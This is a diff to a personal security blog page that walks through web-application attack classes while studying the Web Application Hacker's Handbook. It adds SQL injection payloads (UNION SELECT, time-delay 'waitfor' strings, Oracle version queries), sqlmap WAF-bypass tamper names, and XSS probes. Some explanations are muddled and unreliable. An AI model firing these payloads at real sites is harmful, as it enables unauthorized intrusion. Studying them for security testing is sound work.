@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-10-10T14:54:18 EDT">
+<meta name="revised" content="2019-11-21T11:38:55 EST">
 <title>USER INPUT OF DOOM :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -751,7 +751,7 @@
     
     
     
-    <p>Talk about Bypass passing WAFS, and other mechanism I will be using &ldquo;Web Application hackers handbook&rdquo; as my guide. We&rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.</p>
+    <p>Bypassing WAFS, and other mechanism, using &ldquo;Web Application hackers handbook&rdquo; as my guide. We&rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.</p>
 
 <p>I&rsquo;ve heard good things about this book and figured doing a small writeup on it might be a fun experience.</p>
 
@@ -780,8 +780,15 @@
 
 <p>In Some cases the <em>BlackList</em> may be more stringent, you can use nonstandard characters between expression. Like Encoding the input url encoded base64 etc. were <mark>%09</mark> is used and <em>foo</em></p>
 
-<pre><code>SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
+<pre><code>AND 1=2 UNION SELECT NULL, NULL,'a', NULL, NULL, NULL, NULL, NULL
+SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
 &lt;img%09onerror=alert(1) src=a&gt;
+</code></pre>
+
+<p>Oracle</p>
+
+<pre><code>SELECT banner FROM v$version
+SELECT version FROM v$instance
 </code></pre>
 
 <p>There are plenty of examples from the hackthebox challenges of changing thing slightly to bypass These blacklist. This can also apply to file upload abilities. I think the most common would have to be file upload extensions. Go to the search bar type in waf, upload. some boxes should come up (mischief, friend zone, ).</p>
@@ -800,11 +807,30 @@
 
 <p>So, really i would like to give something fancy here but there isn&rsquo;t anything fancy to say if you get a server error form entering in the basics you have the beginning of sql injection. i often exaggeration sql there are allot of parameters but using the basic open source tools we have in kali is all we need to enumerate sql. while the scanners run do some manual testing.</p>
 
+<p>In the example below adding a single quote to the end of the queried string will resault in an error if the query isn&rsquo;t parameterization ampersand will discard changes after the code is excluded. So it wont return after the &amp;.  &amp;&amp; will store the value and the next time the query is run it will reuses variable.</p>
+
+<pre><code>get /premium?query=13456
+
+get /premium?query=13456'
+get /premium?query=13456%00
+get /premium?query=13456&amp;&amp;
+get /premium?query=13456#
+</code></pre>
+
 <p>So, Using time delay&rsquo;s is a fancy and easy way to look for sql injection. It can be exceptionally useful during finding blind sql injection the results aren&rsquo;t returned. This is where the time delays technique shines, it can also be useful in other ways like where standard techniques fail supplying crafted input.</p>
 
-<pre><code>'; waitfor delay '0:30:0'--
+<pre><code>'
+'; waitfor delay '0:30:0'--
 1; waitfor delay '0:30:0'--
 !@#%^&amp;&amp;*]('&quot;
+</code></pre>
+
+<p><strong>SQLMAP</strong></p>
+
+<pre><code>
+</code></pre>
+
+<pre><code>between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
 </code></pre>
 
 <p><strong>XSS    CROSS SITE SCRIPTING</strong></p>
@@ -942,7 +968,7 @@ Hi&lt;script&gt;alert(123)&lt;/script&gt;
 <pre><code>url.com/login?next=javascript:alert(document.domain)
 </code></pre>
 
-<p><img src="/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/url-xss.png" alt="url-xss" /></p>
+<p><img src="https://chickenpwny.github.io/images/user-input/url-xss.png" alt="url-xss" /></p>
 
 <pre><code>
     Take this URL: https://app.mopub.com/login?next=https://google.com
@@ -957,7 +983,7 @@ Hi&lt;script&gt;alert(123)&lt;/script&gt;
 <pre><code>javascript: Markdown [xss](.alert(123);)
 </code></pre>
 
-<p><img src="/home/pwny_sec/Documents/Hugo/sites/blog/static/images/user-input/xss-xml.png" alt="xss-xml" /></p>
+<p><img src="https://chickenpwny.github.io/images/user-input/xss-xml.png" alt="xss-xml" /></p>
 
 <pre><code>POC URL 1:
 
